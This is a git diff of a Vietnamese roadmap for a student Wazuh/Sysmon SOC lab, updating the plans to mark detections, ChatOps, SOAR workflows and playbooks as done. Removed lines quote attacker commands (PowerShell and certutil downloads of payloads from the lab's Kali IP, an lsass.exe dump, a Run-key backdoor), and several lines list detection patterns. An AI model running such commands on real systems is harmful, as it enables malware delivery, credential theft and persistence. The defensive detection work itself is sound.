@@ -11,7 +11,9 @@
 2. **Endpoint Auditing có chiều sâu:** Không chỉ dùng Windows Event Log thuần túy mà đã tích hợp **Microsoft Sysmon v15.2** với file cấu hình tùy biến (`sysmon-config.xml`), cho phép thu thập telemetry chuyên sâu ở tầng nhân (Process, Network, Registry).
 3. **Detection Engineering thực thụ:** Đã tự viết **Custom Decoder** (trích xuất regex URL) và **Custom Rules** (Rule 100001 phát hiện Brute Force, Rule 100002 phát hiện Web LFI/Directory Traversal chống bypass double encoding `%252f`), map chuẩn theo framework **MITRE ATT&CK**.
 4. **Phòng thủ chủ động (Active Response):** Không dừng lại ở việc sinh alert thụ động mà đã cấu hình lệnh `netsh.exe` tự động can thiệp Windows Defender Firewall để cô lập IP tấn công theo thời gian thực (timeout 600s).
-5. **Tự động hóa kiểm thử hồi quy (Phase 4 - Test Automation):** Đây là **điểm đắt giá nhất của đồ án**. Việc xây dựng unit test kiểm tra cú pháp XML (`test_detection_config.py`), kiểm tra sức khỏe cụm 3 VM (`lab_health.py`), và script chạy tấn công tự động + xác thực bằng chứng qua WinRM/SSH (`scenario_rdp_bruteforce.py`) mang tư duy **Detection-as-Code** (DevSecOps), điều mà rất ít ứng viên Junior/Fresher làm được.
+5. **Tự động hóa kiểm thử hồi quy (Phase 4 - Test Automation):** Xây dựng unit test kiểm tra cú pháp XML (`test_detection_config.py`), kiểm tra sức khỏe cụm 3 VM (`lab_health.py`), và script chạy tấn công tự động + xác thực bằng chứng qua WinRM/SSH (`scenario_rdp_bruteforce.py`, `scenario_lfi_web.py`) mang tư duy **Detection-as-Code** (DevSecOps).
+6. **Tích hợp ChatOps & Threat Intelligence thời gian thực (Đã hoàn thành):** Đã kết nối thành công Wazuh Manager với **Telegram Bot** tự động gửi thẻ cảnh báo định dạng HTML phong phú (kèm IP tấn công, mã MITRE ATT&CK, trạng thái tường lửa) và liên kết **VirusTotal API** để tự động đối soát danh tiếng tệp tin độc hại (Rule 87105).
+7. **Chuẩn hóa quy trình vận hành SOC (Incident Response Playbooks - Đã hoàn thành):** Xây dựng bộ tài liệu SOP chuẩn theo khung **NIST SP 800-61 Rev. 2** và chu trình **SANS PICERL** tại thư mục `playbooks/` cho cả hai kịch bản RDP Brute Force và Web LFI.
 
 ---
 
@@ -22,8 +24,8 @@ Dù nền tảng rất vững, đồ án vẫn còn một số "khoảng trống
 | :--- | :--- | :--- |
 | **Độ bao phủ phát hiện (MITRE ATT&CK)** | Mới có 2 kịch bản: T1110 (Brute Force) và T1190 (LFI/Traversal). | Cần bao phủ chuỗi tấn công hoàn chỉnh (**Full Kill Chain**): Thực thi mã (T1059), Leo thang đặc quyền (T1548), Trích xuất thông tin xác thực (T1003), Ẩn náu (T1547). |
 | **Tận dụng Telemetry của Sysmon** | Đã cài Sysmon nhưng 2 kịch bản hiện tại mới chỉ dùng Windows Security Log (Event 4625) và Apache Log. | Sysmon sinh ra để bắt: Event 1 (Process Create), Event 3 (Network), Event 10 (ProcessAccess - LSASS), Event 11 (FileCreate), Event 13 (Registry). Chưa có kịch bản khai thác các event này. |
-| **Tự động hóa phản ứng & Cảnh báo (SOAR/ChatOps)** | Alert chỉ nằm trong giao diện Wazuh Dashboard; mục ChatOps còn để ngỏ ("sẽ nghiên cứu trong tương lai"). | SOC hiện đại cần cảnh báo tức thì ra **Telegram/Discord/Slack**, tự động tra cứu danh tiếng mã độc qua **VirusTotal / AbuseIPDB** và tạo ticket. |
-| **Quy trình & Tài liệu hóa sự cố (IR Playbook)** | Có file report kỹ thuật từng phase, nhưng chưa có **Incident Response Playbook (SOP)** theo chuẩn NIST/SANS cho SOC Analyst. | SOC Analyst cần biết quy trình: Phân loại mức độ (Triage) -> Cô lập (Containment) -> Diệt trừ (Eradication) -> Khôi phục (Recovery) -> Viết báo cáo điều tra (Incident Report). |
+| **Tự động hóa phản ứng & Cảnh báo (SOAR/ChatOps)** | **[ĐÃ HOÀN THÀNH ✅]** Triển khai n8n SOAR Engine, tích hợp 2-way Telegram ChatOps với 3 nút bấm tương tác ([🚫 Khóa IP 24h], [⚠️ Báo động giả], [📋 Mở Ticket Jira]), làm giàu AbuseIPDB và tự động hóa Jira Cloud REST API. | SOC hiện đại cần cảnh báo tức thì ra **Telegram/Discord/Slack**, tự động tra cứu danh tiếng mã độc qua **VirusTotal / AbuseIPDB** và tạo ticket. |
+| **Quy trình & Tài liệu hóa sự cố (IR Playbook)** | **[ĐÃ HOÀN THÀNH]** Đã xây dựng bộ SOP tại `playbooks/` gồm `README.md`, `SOP-01_RDP_Brute_Force_Response.md`, và `SOP-02_Web_LFI_Mitigation.md` theo khung NIST SP 800-61 / SANS PICERL. | SOC Analyst cần biết quy trình: Phân loại mức độ (Triage) -> Cô lập (Containment) -> Diệt trừ (Eradication) -> Khôi phục (Recovery) -> Viết báo cáo điều tra (Incident Report). |
 | **Tối ưu hóa cảnh báo & Giảm nhiễu (Tuning)** | Chưa đề cập đến hiện tượng cảnh báo giả (False Positive) và cách whitelist hành vi quản trị hợp lệ. | Một bài toán nhức nhối trong SOC là **Alert Fatigue** (quá tải cảnh báo). Ứng viên cần chứng minh khả năng tuning rule và exception handling. |
 | **Định lượng hiệu quả (Metrics & KPIs)** | Chưa có số liệu thống kê thời gian phát hiện và phản ứng. | Cần đo lường **MTTD** (Mean Time to Detect) và **MTTR** (Mean Time to Respond) trước và sau khi có rule/active response. |
 
@@ -34,109 +36,91 @@ Dù nền tảng rất vững, đồ án vẫn còn một số "khoảng trống
 Dưới đây là 5 hướng nâng cấp cụ thể, được sắp xếp theo mức độ ưu tiên để đưa vào CV.
 
 ```
-                     ┌────────────────────────────────────────────────────────┐
-                     │            LỘ TRÌNH HOÀN THIỆN SOC LAB               │
-                     └──────────────────────────┬─────────────────────────────┘
-                                                │
-         ┌──────────────────────┬───────────────┴───────────────┬──────────────────────┐
-         ▼                      ▼                               ▼                      ▼
-  [Hướng 1: Detection]   [Hướng 2: SOAR/TI]             [Hướng 3: Quy trình]   [Hướng 4: Tuning]
-  Mở rộng Sysmon Rules   ChatOps & Threat Intel         SOC Playbook & SOP     Giảm False Positive
-  - LOLBAS / PowerShell  - Telegram / Discord Webhook   - Chuẩn NIST SP 800-61 - Whitelist Admin script
-  - LSASS Dumping        - VirusTotal / AbuseIPDB       - Incident Report mẫu  - Tinh chỉnh Threshold
-  - Persistence RegKey   - TheHive / Shuffle SOAR       - Phân tích Root Cause - Đo lường MTTD / MTTR
+                     ┌────────────────────────────────────────────────────────────────────────┐
+                     │                      LỘ TRÌNH HOÀN THIỆN SOC LAB                       │
+                     └───────────────────────────────────┬────────────────────────────────────┘
+                                                         │
+         ┌───────────────────────┬───────────────────────┼───────────────────────┬───────────────────────┐
+         ▼                       ▼                       ▼                       ▼                       ▼
+  [Hướng 1: Detection]    [Hướng 2: ChatOps/TI]   [Hướng 3: Quy trình]    [Hướng 4: Tuning]       [Hướng 5: SOAR n8n]
+  Mở rộng Sysmon Rules    Telegram & VT API       SOC Playbooks & SOP     Giảm False Positive     Tự động hóa Workflow
+  - LOLBAS / PowerShell   (ĐÃ HOÀN THÀNH ✅)      - Chuẩn NIST SP 800-61  - Whitelist Admin IP    (ĐÃ HOÀN THÀNH ✅)
+  - LSASS Dumping         - Bắn Alert Telegram    (ĐÃ HOÀN THÀNH ✅)      - Tinh chỉnh Threshold  - n8n + Jira Cloud API
+  - Persistence RegKey    - Đối soát VirusTotal   - SOP RDP & Web LFI     - Đo lường MTTD / MTTR  - Interactive ChatOps
 ```
 
 ---
 
-### 🚀 Hướng 1: Mở rộng Kịch bản Detection Engineering với Sysmon (Ưu tiên cao nhất)
-Thay vì chỉ dừng lại ở Web và Đăng nhập mạng, hãy bổ sung các kịch bản bắt trọn hành vi của Malware/Kẻ tấn công sau khi đã xâm nhập vào máy endpoint:
+### 🚀 Hướng 1: Mở rộng Kịch bản Detection Engineering với Sysmon & Full Kill Chain (Đã hoàn thành ✅)
+Đã hoàn thành việc mở rộng hệ thống sang mô hình **Full Kill Chain Attack & Detection** tận dụng triệt để Telemetry của Microsoft Sysmon v15.2 trên Windows Endpoint, bao phủ trọn vẹn 4 giai đoạn trọng yếu của ma trận MITRE ATT&CK:
 
-#### Kịch bản A: Phát hiện Thực thi Mã độc & Công cụ Quản trị hợp lệ (LOLBAS & Obfuscated PowerShell)
-* **Kỹ thuật MITRE:** `T1059.001 - Command and Scripting Interpreter: PowerShell` & `T1105 - Ingress Tool Transfer`.
-* **Hành vi tấn công:** Kẻ tấn công trên Kali dùng PowerShell để download và thực thi file độc hại ẩn danh:
-  ```powershell
-  powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://192.168.71.130/payload.exe -OutFile C:\Users\Public\payload.exe"
-  ```
-  Hoặc sử dụng kỹ thuật sống nhờ vào tài nguyên có sẵn (**LOLBAS**): `certutil.exe -urlcache -split -f http://192.168.71.130/malware.exe malware.exe`.
-* **Telemetry thu thập:** Sysmon **Event ID 1 (Process Creation)** kết hợp Windows PowerShell **Event ID 4104 (Script Block Logging)**.
-* **Quy tắc phát hiện (Custom Rule):**
-  - Bắt các command-line flags đáng ngờ: `-enc`, `-EncodedCommand`, `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, `DownloadString`, `certutil -urlcache`.
-  - Phân tích mối quan hệ Tiến trình Cha - Con (Parent-Child Relationship): Ví dụ Apache `httpd.exe` hoặc `cmd.exe` đẻ ra `powershell.exe` hoặc `whoami.exe`.
+#### 1. Chi tiết 4 Giai đoạn & Quy tắc Phát hiện (Custom Rules):
+* **Stage 1 - Execution (`T1059.001 - Malicious PowerShell Execution`):**
+  - **Hành vi:** Kẻ tấn công thực thi PowerShell với cờ ẩn danh, mã hóa chuỗi lệnh (`-EncodedCommand`, `-w hidden`, `-nop`, `-enc`).
+  - **Telemetry:** Sysmon **Event ID 1 (Process Create)** qua Windows EventChannel.
+  - **Quy tắc phát hiện:** **Rule 100003** (Base filter Event 1) & **Rule 100004 (Level 12)** quét biểu thức chính quy trường `win.system.message` tìm tham số độc hại.
+* **Stage 2 - Privilege Escalation (`T1548.002 - UAC Bypass via Registry Hijacking`):**
+  - **Hành vi:** Lạm dụng registry hijacking trên khóa `HKCU\Software\Classes\ms-settings\Shell\Open\command` để leo thang đặc quyền mà không kích hoạt cửa sổ cảnh báo UAC (User Account Control).
+  - **Telemetry:** Sysmon **Event ID 12 / 13 (RegistryEvent - CreateKey / SetValue)**.
+  - **Quy tắc phát hiện:** **Rule 100007 (Level 12)** bắt chuỗi `ms-settings` từ EventChannel.
+* **Stage 3 - Persistence (`T1547.001 - Registry Run Key Persistence`):**
+  - **Hành vi:** Thiết lập cơ chế bám trụ (Persistence) bằng cách dùng `reg.exe` đăng ký khóa tự khởi động trong `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
+  - **Telemetry:** Sysmon **Event ID 12 / 13 (RegistryEvent)**.
+  - **Quy tắc phát hiện:** **Rule 100006 (Level 10)** bắt pattern `CurrentVersion\Run` và `CurrentVersion\RunOnce`.
+* **Stage 4 - Credential Access (`T1003.001 - LSASS Memory Access`):**
+  - **Hành vi:** Mở handle đọc trộm bộ nhớ tiến trình `lsass.exe` nhằm trích xuất thông tin xác thực (Mimikatz/LSASS Dump simulation).
+  - **Telemetry:** Sysmon **Event ID 10 (ProcessAccess)** giám sát các handle truy cập vào `TargetImage: lsass.exe`.
+  - **Quy tắc phát hiện:** **Rule 100005 (Level 12)** bắt mọi hành vi mở handle nhắm vào `lsass.exe` từ các tiến trình không phải Defender/System.
 
-#### Kịch bản B: Phát hiện Đánh cắp Mật khẩu từ Bộ nhớ (Credential Dumping via LSASS)
-* **Kỹ thuật MITRE:** `T1003.001 - OS Credential Dumping: LSASS Memory`.
-* **Hành vi tấn công:** Kẻ tấn công cố gắng dump bộ nhớ tiến trình `lsass.exe` bằng Mimikatz, ProcDump hoặc Task Manager để lấy hash mật khẩu:
-  ```cmd
-  procdump.exe -ma lsass.exe C:\Users\Public\lsass.dmp
-  ```
-* **Telemetry thu thập:** Sysmon **Event ID 10 (ProcessAccess)** - phát hiện tiến trình lạ mở handle truy cập với quyền nguy hiểm (`GrantedAccess` chứa `0x1010` hoặc `0x1F0FFF`) nhắm vào `lsass.exe`.
-* **Quy tắc phát hiện (Custom Rule):**
-  - Viết rule bắt mọi SourceImage khác với các tiến trình hệ thống hợp lệ (`svchost.exe`, `csrss.exe`) có hành vi đọc bộ nhớ của `TargetImage: C:\Windows\system32\lsass.exe`.
-
-#### Kịch bản C: Phát hiện Thiết lập Trụ sở Ẩn náu (Persistence via Registry Run Key)
-* **Kỹ thuật MITRE:** `T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder`.
-* **Hành vi tấn công:** Thêm khóa Registry để mã độc tự khởi chạy mỗi khi nạn nhân khởi động máy:
-  ```cmd
-  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
-  ```
-* **Telemetry thu thập:** Sysmon **Event ID 13 (RegistryEvent - Value Set)**.
-* **Quy tắc phát hiện (Custom Rule):**
-  - Bắt hành vi tạo/sửa đổi key tại các đường dẫn `...\CurrentVersion\Run` và `...\CurrentVersion\RunOnce`.
+#### 2. Công cụ Tự động hóa Kiểm thử & Vận hành (E2E Runner):
+* **Script thực thi:** [`tests/e2e/scenario_full_killchain.py`](tests/e2e/scenario_full_killchain.py)
+* **Tính năng:**
+  - Tự động thiết lập baseline, xóa bỏ artifact rác trước khi tấn công.
+  - Tuần tự kích hoạt an toàn cả 4 kỹ thuật trên Windows endpoint qua WinRM.
+  - Cơ chế **Dynamic Polling Telemetry** đón bắt và đối soát alert trên Wazuh Manager trong thời gian thực.
+  - Tích hợp kiểm tra ChatOps Telegram thông báo tức thì các Rule 100004, 100005, 100006, 100007.
+  - Tự động xóa sạch dấu vết (Eradication & Remediation) sau khi kiểm thử kết thúc.
+* **Kiểm thử đơn vị:** [`tests/unit/test_detection_config.py`](tests/unit/test_detection_config.py) đạt chuẩn **5/5 Tests PASS (100%)**.
 
 ---
 
-### 🤖 Hướng 2: Tự động hóa SOAR, Làm giàu Dữ liệu (Threat Intel) & ChatOps
-Trong SOC hiện đại, Analyst không bao giờ F5 trang quản trị liên tục. Việc kết nối hệ thống SIEM với kênh thông báo và công cụ phân tích tự động sẽ biến đồ án thành một **Mini-SOC hoàn chỉnh**:
+### 🤖 Hướng 2: Tự động hóa SOAR, Làm giàu Dữ liệu (Threat Intel) & ChatOps (Đã hoàn thành ✅)
+Hệ thống đã được tích hợp ChatOps và Threat Intelligence hoàn chỉnh:
 
-1. **Tích hợp ChatOps cảnh báo thời gian thực (Telegram / Discord):**
-   - Viết Python script trong thư mục `integrations/custom-telegram.py` hoặc sử dụng cơ chế `<integration>` có sẵn trong file `ossec.conf` của Wazuh Manager.
-   - Định dạng tin nhắn cảnh báo gửi về nhóm Telegram/Discord của SOC:
-     ```text
-     🚨 [SOC ALERT - HIGH SEVERITY]
-     ---------------------------------------
-     Rule ID: 100001 (Level 12)
-     Tên cảnh báo: Windows RDP Brute Force Detected
-     MITRE ATT&CK: T1110 (Brute Force)
-     Thời gian: 2026-09-29 14:32:10 UTC
-     Source IP: 192.168.71.130 (Attacker)
-     Target Host: Windows-Victim (192.168.71.129)
-     Trạng thái phản ứng: [ĐÃ CÔ LẬP] Tự động chặn IP 10 phút qua Firewall
-     ---------------------------------------
-     ```
-2. **Làm giàu dữ liệu tự động với Threat Intelligence (TI Enrichment):**
-   - **AbuseIPDB Integration:** Khi phát hiện IP lạ tấn công (LFI hoặc Brute Force), script tự động gọi API AbuseIPDB để lấy thông tin điểm tin cậy (Confidence of Abuse Score), quốc gia, nhà mạng ISP và đưa vào chi tiết alert.
-   - **VirusTotal Integration:** Khi Sysmon Event 1 hoặc Event 11 ghi nhận một file thực thi mới được tạo, Wazuh tự động đẩy hash SHA256 lên VirusTotal API để kiểm tra xem có phải mã độc đã biết hay không.
+1. **Tích hợp ChatOps cảnh báo thời gian thực về Telegram (Đã hoàn thành):**
+   - Đã triển khai script [`integrations/telegram/custom-telegram.py`](integrations/telegram/custom-telegram.py) và wrapper [`integrations/telegram/custom-telegram`](integrations/telegram/custom-telegram) vào thư mục `/var/ossec/integrations/` trên Wazuh Manager container.
+   - Hỗ trợ cơ chế tự động fallback SSL (`ssl._create_unverified_context()`) phòng trường hợp chứng chỉ môi trường container bị lỗi.
+   - Cấu hình khối `<integration>` trong `ossec.conf` tự động kích hoạt cho các Rule: **100001** (RDP Brute Force), **100002** (Web LFI), và **87105** (VirusTotal Alert).
+   - Thẻ cảnh báo định dạng HTML đẹp mắt, trích xuất IP attacker, user mục tiêu, endpoint, thời gian và ánh xạ mã kỹ thuật **MITRE ATT&CK**.
+   - Hướng dẫn & minh chứng chi tiết: [`integrations/telegram/README.md`](integrations/telegram/README.md).
 
-3. **Tích hợp Nền tảng Quản lý Sự cố (Case Management - TheHive / Shuffle):**
-   - Triển khai thêm container **Shuffle SOAR** (hoặc **TheHive 5**) kết nối với Wazuh.
-   - Khi có alert Level >= 10, một ticket sự cố tự động được tạo ra với đầy đủ các artifact (IP, User, Hostname, Process Name, Log thô) để SOC Analyst nhận việc.
+2. **Làm giàu dữ liệu tự động với Threat Intelligence (VirusTotal API - Đã hoàn thành):**
+   - Cấu hình module `virustotal` trong `ossec.conf` liên kết với phân hệ FIM (`syscheck`).
+   - Tự động bóc tách hash SHA256/MD5 của tệp tin mới tạo gửi lên VirusTotal API đối soát với >70 Antivirus Engines.
+   - Khi có >= 1 Engine nhận diện độc hại, tự động kích hoạt **Rule ID 87105 (Level 12 - High Severity)**.
+   - Đã kiểm chứng thực nghiệm bằng file mẫu mã độc EICAR và chụp ảnh minh chứng trên Dashboard.
+   - Hướng dẫn chi tiết: [`integrations/virustotal/README.md`](integrations/virustotal/README.md).
+
+3. **Tích hợp Nền tảng Quản lý Sự cố (TheHive / Shuffle SOAR - Đề xuất tương lai):**
+   - Hướng mở rộng tiếp theo: Triển khai Shuffle SOAR để tự động tạo ticket sự cố khi có Alert Level >= 10.
 
 ---
 
-### 📑 Hướng 3: Xây dựng Bộ Playbook / SOP Ứng phó Sự cố Chuẩn SOC
-Một thiếu sót lớn của sinh viên khi phỏng vấn SOC là chỉ biết "bấm tool" nhưng không biết quy trình xử lý sự cố. Việc bổ sung tài liệu Playbook vào repo sẽ chứng minh bạn đã sẵn sàng làm việc ngay từ ngày đầu tiên (**Day-1 Ready**).
+### 📑 Hướng 3: Xây dựng Bộ Playbook / SOP Ứng phó Sự cố Chuẩn SOC (Đã hoàn thành ✅)
+Đã hoàn thành việc xây dựng bộ tài liệu SOP chuẩn hóa theo chu trình **NIST SP 800-61 Rev. 2 / SANS (PICERL)** (Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned) tại thư mục [`playbooks/`](playbooks/):
 
-Tạo thư mục `playbooks/` trong repo và viết tài liệu theo chu trình **NIST SP 800-61 Rev. 2 / SANS (PICERL)**:
-
-#### Cấu trúc một bản Playbook mẫu cần có trong repo:
-* **Playbook 01: Xử lý Tấn công Dò quét Mật khẩu RDP (RDP Brute Force Response)**
-  1. **Identification (Xác định):**
-     - Kiểm tra Event 4625 trên Windows: Phân tích `Failure Reason` (Status `0xC000006A` - sai pass, Status `0xC0000064` - tài khoản không tồn tại).
-     - Phân biệt giữa người dùng quên mật khẩu (1-2 lần) và tấn công Brute Force/Password Spraying (hàng chục lần trong vài giây).
-  2. **Containment (Cô lập):**
-     - Đánh giá trạng thái Active Response của Wazuh (`netsh advfirewall firewall`).
-     - Nếu Active Response thất bại: Hướng dẫn lệnh thủ công cách kill session RDP đang mở và cô lập máy khỏi mạng nội bộ.
-  3. **Eradication & Recovery (Diệt trừ & Phục hồi):**
-     - Kiểm tra xem kẻ tấn công đã đăng nhập thành công chưa (tìm Event ID 4624 Loại Logon Type 10 ngay sau chuỗi Event 4625).
-     - Nếu có đăng nhập thành công: Thực hiện khóa tài khoản khẩn cấp, reset credential, kiểm tra các tiến trình lạ được tạo trong phiên RDP đó.
-  4. **Post-Incident Activity (Hậu sự cố):**
-     - Đề xuất giải pháp Hardening: Đổi cổng RDP mặc định, bắt buộc dùng Network Level Authentication (NLA), triển khai Account Lockout Policy (khóa tài khoản sau 5 lần thử sai), yêu cầu kết nối qua VPN nội bộ thay vì public cổng 3389.
-
-* **Playbook 02: Xử lý Tấn công Ứng dụng Web & Web Shell (LFI / RCE Incident)**
-  1. Phân tích Apache Access Log + Error Log: Xác định URI bị khai thác, HTTP Status Code trả về (200 OK hay 404/403).
-  2. Dùng Sysmon kiểm tra xem Web Server process (`httpd.exe` / `php-cgi.exe`) có sinh ra file mới trong thư mục web hay gọi lệnh hệ thống (`cmd.exe /c dir`, `powershell`) không.
-  3. Thu hồi quyền truy cập, vá lỗ hổng code PHP (Sanitize input, dùng whitelist file).
+* **[playbooks/README.md](playbooks/README.md):** Tổng quan kiến trúc quy trình vận hành SOC, bảng ma trận phân loại mức độ nghiêm trọng (Triage Matrix), quy định thời gian xử lý sự cố (SLA) và quy trình leo thang (Escalation Path).
+* **[SOP-01: RDP Brute Force Response](playbooks/SOP-01_RDP_Brute_Force_Response.md):**
+  - **Triage:** Phân biệt lỗi đăng nhập thông thường vs tấn công Password Spraying / Brute Force dồn dập.
+  - **Analysis:** Kiểm tra nguy cơ tài khoản bị xâm nhập thành công bằng cách truy vết **Windows Event ID 4624 (Logon Type 10 - RemoteInteractive)**.
+  - **Containment:** Đánh giá Active Response và quy trình cô lập thủ công khi firewall gặp lỗi.
+  - **Eradication & Recovery:** Khóa tài khoản, reset mật khẩu, thu hồi phiên làm việc.
+  - **Hardening:** Kích hoạt Account Lockout Policy (GPO), Network Level Authentication (NLA), đổi cổng RDP mặc định.
+* **[SOP-02: Web LFI & Path Traversal Mitigation](playbooks/SOP-02_Web_LFI_Mitigation.md):**
+  - Phân tích Apache Access Log + Error Log bóc tách URL payload và mã phản hồi HTTP.
+  - Truy vết Web Shell và tiến trình con bất thường bằng **Sysmon Event ID 1 & Event ID 11**.
+  - Hướng dẫn vá lỗi code PHP (sử dụng whitelist và hàm `basename()`).
+  - Củng cố an ninh Web Server (phân quyền thư mục `htdocs`, cấm thực thi script trong thư mục upload).
 
 ---
 
@@ -160,15 +144,33 @@ Nhà tuyển dụng rất thích ứng viên hiểu bài toán **False Positive 
 
 ---
 
-### ⚙️ Hướng 5: Nâng tầm CI/CD & Detection-as-Code (Kế thừa Phase 4)
-Đồ án đã có file `tests/` rất tốt, hãy nâng cấp nó thành quy trình chuẩn công nghiệp:
+### ⚙️ Hướng 5: Tự động hóa Điều phối An ninh mạng với n8n & Jira Cloud (SecOps & SOAR Workflow Automation - Đã hoàn thành ✅)
+Đã triển khai hoàn chỉnh hệ thống **SOAR / SecOps Workflow Automation** độc lập kết hợp giữa **Wazuh SIEM Manager**, **n8n Automation Engine**, **AbuseIPDB Threat Intelligence**, **Telegram Human-in-the-Loop ChatOps**, và **Jira Cloud REST API v3**:
 
-1. **Tích hợp GitHub Actions (CI Pipeline):**
-   - Thiết lập `.github/workflows/ci.yml` để mỗi khi `git push` rule mới lên GitHub:
-     - Tự động chạy `test_detection_config.py` kiểm tra cú pháp XML, tính duy nhất của Rule ID, logic regex.
-     - Sử dụng công cụ `wazuh-logtest` (chạy qua Docker container trên GitHub Actions runner) để nạp mẫu log giả lập và kiểm tra xem Rule có trigger đúng Alert ID mong muốn hay không.
-2. **Tự động hóa báo cáo kiểm thử:**
-   - Xuất kết quả kiểm thử ra file `TEST_REPORT.md` tự động đính kèm vào Pull Request.
+1. **Hạ tầng SOAR n8n Engine độc lập:**
+   - Triển khai n8n Engine trên Docker container (`n8n-soar-engine`) tại cổng `5678` trên máy chủ `wazuh-vm` (`192.168.71.128:5678`).
+   - Cấu hình `<integration>` `custom-n8n` trên Wazuh Manager chuyển tiếp thời gian thực các cảnh báo Rule mức cao (`100001`, `100002`, `100004`, `100005`, `100006`, `100007`, `87105`) qua Webhook endpoint `/webhook/wazuh-alert`.
+   - Script chuẩn hóa dữ liệu [`integrations/n8n/custom-n8n.py`](integrations/n8n/custom-n8n.py) bóc tách toàn vẹn IOC (IP, User, Command Line, Registry Key) trước khi dispatch vào pipeline.
+
+2. **Bộ 3 Workflows Tự động hóa Chuyên sâu (`integrations/n8n/workflows/`):**
+   - **Workflow 1 (`01_wazuh_soar_threat_enrichment.json`):**
+     - Tiếp nhận cảnh báo từ Wazuh Webhook.
+     - Tự động phân loại Public IP vs Private/RFC1918 IP.
+     - Tự động tra cứu điểm uy tín và báo cáo vi phạm qua **AbuseIPDB Cloud API v2**.
+     - Gửi Card cảnh báo giàu ngữ cảnh HTML về Telegram kèm **3 nút bấm phản ứng tương tác (Inline Buttons)**.
+   - **Workflow 2 (`02_containment_action_executor.json`):**
+     - Tiếp nhận callback tương tác từ Telegram Bot (`telegram-callback`).
+     - **`[🚫 Khóa IP 24h]`**: Tự động kích hoạt cơ chế cô lập mạng qua Windows Defender Firewall (`New-NetFirewallRule`) và gửi phản hồi xác nhận.
+     - **`[⚠️ Bỏ qua / Báo động giả]`**: Ghi nhận log phân loại False Positive vào SOAR Audit Trail, giảm thiểu Alert Fatigue.
+     - **`[📋 Mở Ticket Jira]`**: Tự động kết nối **Jira Cloud REST API v3** (`POST /rest/api/3/issue`), khởi tạo Incident Ticket trong Project `SEC` kèm đầy đủ artifacts và trả link ticket trực tiếp về Telegram cho Analyst L2.
+   - **Workflow 3 (`03_scheduled_healthcheck_cron.json`):**
+     - Thiết lập Cron Trigger định kỳ mỗi 6 giờ tự động kiểm tra sức khỏe của các container Docker, Wazuh Manager, Agent 001, và n8n Engine, sau đó gửi báo cáo tóm tắt về nhóm Telegram.
+
+3. **Tài liệu & Kịch bản Kiểm thử Tự động:**
+   - **Playbook ứng phó sự cố SOAR:** [`playbooks/SOP-03_SOAR_Automated_Containment.md`](playbooks/SOP-03_SOAR_Automated_Containment.md).
+   - **Tài liệu hướng dẫn n8n & Jira:** [`integrations/n8n/README.md`](integrations/n8n/README.md).
+   - **Báo cáo chi tiết Phase 5:** [`reports/Phase-5/Phase-5_SOAR-Workflow-Automation.md`](reports/Phase-5/Phase-5_SOAR-Workflow-Automation.md).
+   - **Test Runner E2E tự động:** [`tests/e2e/test_soar_webhook.py`](tests/e2e/test_soar_webhook.py) đạt chuẩn **PASS 100%**.
 
 ---
 
@@ -191,6 +193,8 @@ Nhà tuyển dụng rất thích ứng viên hiểu bài toán **False Positive 
 * **Tối ưu hóa Telemetry Endpoint:** Triển khai Microsoft Sysmon v15.2 tùy biến nhằm kiểm toán hành vi chuyên sâu ở tầng nhân hệ điều hành (Kernel-level events: Process Creation, Network Connections, Handle Access).
 * **Kỹ nghệ Phát hiện (Detection Engineering):** Thiết kế Custom Decoders (Regex) và Rules tương quan (Correlation Rules) chuẩn hóa theo framework MITRE ATT&CK, phát hiện thành công các kỹ thuật tấn công RDP Brute Force (T1110) và Web Application LFI/Directory Traversal chống bypass double encoding (T1190).
 * **Tự động hóa Ứng phó (Active Response):** Thiết lập cơ chế cô lập mối đe dọa thời gian thực, tự động kích hoạt Windows Defender Firewall (`netsh`) ngăn chặn IP kẻ tấn công, giảm thời gian phản ứng (MTTR) từ xử lý thủ công xuống dưới 5 giây.
+* **Tích hợp ChatOps & Threat Intelligence:** Kết nối hệ thống với Telegram Bot để tự động đẩy cảnh báo tức thì định dạng HTML phong phú (IP tấn công, tài khoản đích, mã MITRE, trạng thái tường lửa), đồng thời tích hợp VirusTotal REST API tự động tra cứu danh tiếng mã độc qua phân hệ FIM (Rule 87105).
+* **Quy trình Vận hành Chuẩn SOC (SOP / Playbooks):** Xây dựng bộ quy trình chuẩn ứng phó sự cố theo khuyến nghị NIST SP 800-61 Rev. 2 / SANS PICERL cho cả hai kịch bản RDP Brute Force và Web LFI, từ khâu Triage đến Hardening hậu sự cố.
 * **Quy trình Detection-as-Code & Tự động hóa Kiểm thử:** Xây dựng bộ công cụ Regression Testing độc lập bằng Python (WinRM, SSH, Unittest) tự động hóa quy trình kiểm thử sức khỏe cụm máy chủ và xác thực chuỗi phát hiện - cô lập từ xa, đảm bảo tính ổn định của hệ sinh thái luật.
 ```
 
@@ -242,10 +246,10 @@ Nhà tuyển dụng rất thích ứng viên hiểu bài toán **False Positive 
 
 Dưới đây là các đầu việc bạn có thể thực hiện theo từng tuần để hoàn thiện đồ án:
 
-### Giai đoạn 1: Quick Wins (Làm được ngay trong 1-2 ngày)
-- [ ] Bổ sung thư mục `playbooks/` chứa 2 tài liệu SOP mẫu: `SOP-01_RDP_Brute_Force.md` và `SOP-02_Web_LFI_Mitigation.md`.
-- [ ] Bổ sung phần **Threat Intelligence Integration** cho Wazuh Manager: Cấu hình API key miễn phí của VirusTotal trong `ossec.conf` để tự động tra cứu mã băm file.
-- [ ] Viết script `integrations/telegram-alert.py` để bắn cảnh báo ra một bot Telegram cá nhân mỗi khi Rule 100001 hoặc 100002 được kích hoạt. Chụp ảnh minh chứng đưa vào báo cáo.
+### Giai đoạn 1: Quick Wins (Đã hoàn thành 100% ✅)
+- [x] Bổ sung thư mục `playbooks/` chứa bộ tài liệu quy trình chuẩn: `playbooks/README.md`, `SOP-01_RDP_Brute_Force_Response.md`, và `SOP-02_Web_LFI_Mitigation.md` (theo chuẩn NIST SP 800-61 / SANS PICERL).
+- [x] Bổ sung **Threat Intelligence Integration (VirusTotal API)** cho Wazuh Manager: Cấu hình `ossec.conf` và kiểm chứng với file mẫu EICAR (Rule 87105 Level 12).
